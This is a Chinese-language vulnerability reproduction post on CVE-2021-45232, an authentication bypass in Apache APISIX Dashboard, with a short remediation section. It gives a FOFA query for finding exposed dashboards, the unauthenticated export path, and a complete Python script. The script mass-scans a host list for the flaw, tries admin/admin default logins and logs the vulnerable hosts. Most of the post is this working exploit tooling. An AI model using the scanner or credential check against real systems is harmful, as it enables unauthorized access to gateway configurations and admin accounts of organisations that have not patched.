## **0x00漏洞简介**

Apache
APISIX是一个动态、实时、高性能的API网关。提供了丰富的流量管理功能，例如负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等。可以使用Apache
APISIX作为流量入口处理所有业务数据。

CVE-2021-45232：该漏洞是由于Manager API的错误引起的，在2.10.1之前的Apache APISIX
Dashboard版本中，Manager
API使用了两个框架，在gin框架的基础上引入了droplet框架，所有的API和鉴权中间件都是基于droplet框架开发的，但是有些API直接使用了gin框架的接口，从而绕过身份验证。

##  **0x01 影响版本:**

漏洞影响版本：Apache APISIX Dashboard <= 2.10  
当前安全版本：Apache APISIX Dashboard >= 2.10.1

##  **0x02 漏洞复现**

###  fofa搜索:

> title="Apache APISIX Dashboard"

在打开之后把端口后拼接的路径改为/apisix/admin/migrate/export即可

![1640843731_61cd49d3ef4751f817451.png!small?1640843732560](https://image.3001.net/images/20211230/1640843731_61cd49d3ef4751f817451.png!small?1640843732560)

##  **0x03漏洞批量检测脚本**

> import argparse  
> import sys  
>  
> import requests  
> import urllib3  
>  
> urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
>  
> headers = {  
>  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}  
>  
>  
> def banner():  
>  print(r"""  
> _______ ________ ___ ___ ___ __ _ _ _____ ___ ____ ___  
> / ____\ \ / / ____| |__ \ / _ \\__ \/_ | | || | | ____|__ \|___ \\__ \  
> | | \ \ / /| |__ ______ ) | | | | ) || |______| || |_| |__ ) | __) | ) |  
> | | \ \/ / | __|______/ /| | | |/ / | |______|__ _|___ \ / / |__ < / /  
> | |____ \ / | |____ / /_| |_| / /_ | | | | ___) |/ /_ ___) / /_  
> \\_____| \/ |______| |____|\\___/____||_| |_| |____/|____|____/____|  
>  by:Ifory""")  
>  
>  
> def parse_args():  
>  parser = argparse.ArgumentParser(  
>  epilog='\tExample: \r\npython3 ' + sys.argv[0] + ' -u 127.0.0.1:9000')  
>  parser.add_argument("-u", "--url", type=str,  
>  required=False, default=None, help="待检测URL")  
>  parser.add_argument("-f", "--file", type=str,  
>  required=False, default=None, help="批量导入检测")  
>  return parser.parse_args()  
>  
>  
> def handle_url(host):  
>  if 'http' not in host:  
>  host = 'http://' + host  
>  return host  
>  
>  
> def poc(host):  
>  url = host + '/apisix/admin/migrate/export'  
>  try:  
>  respose = requests.get(url, headers=headers, verify=False, timeout=5)  
>  if "Counsumers" in respose.text:  
>  print(f"[+]{host} vul!")  
>  with open("vul.txt", "a", encoding="utf-8") as f:  
>  f.write(f"{url}\n")  
>  else:  
>  print(f"[-]{host} no vul!")  
>  return True  
>  except:  
>  print(f"[-]{host} 页面无法访问")  
>  return False  
>  
>  
> def login(host):  
>  url = host + '/apisix/admin/user/login'  
>  json = {"username": "admin", "password": "admin"}  
>  try:  
>  respose = requests.post(url, headers=headers,  
>  json=json, verify=False, timeout=5)  
>  if '"code":0' in respose.text:  
>  print(f"[+]{host} default password!")  
>  with open("vul_login.txt", "a", encoding="utf-8") as f:  
>  f.write(f"{host}\n")  
>  else:  
>  print(f"[-]{host} no default password!")  
>  except:  
>  print(f"[-]{host} 页面无法访问")  
>  
>  
> if __name__ == '__main__':  
>  banner()  
>  args = parse_args()  
>  if args.url:  
>  host = handle_url(args.url)  
>  if poc(host):  
>  login(host)  
>  else:  
>  if args.file:  
>  with open(f"{args.file}", "r", encoding="utf-8") as put:  
>  for url in put.readlines():  
>  host = url.strip()  
>  host = handle_url(host)  
>  if poc(host):  
>  login(host)

脚本来自于https://github.com/Ifory885/CVE-2021-45232/blob/main/CVE-2021-45232.py

##  **0x04 漏洞修复**

1、升级到安全版本Apache APISIX Dashboard 2.10.1

下载链接：<https://github.com/apache/apisix-dashboard/releases/tag/v2.10.1>

2、修改默认账户的账号密码，或通过白名单的方式限制访问的源IP

  

参考链接:[【漏洞复现】Apache APISIX Dashboard 身份验证绕过漏洞 （CVE-2021-45232） – Adminxe's
Blog](https://www.adminxe.com/3175.html)

  

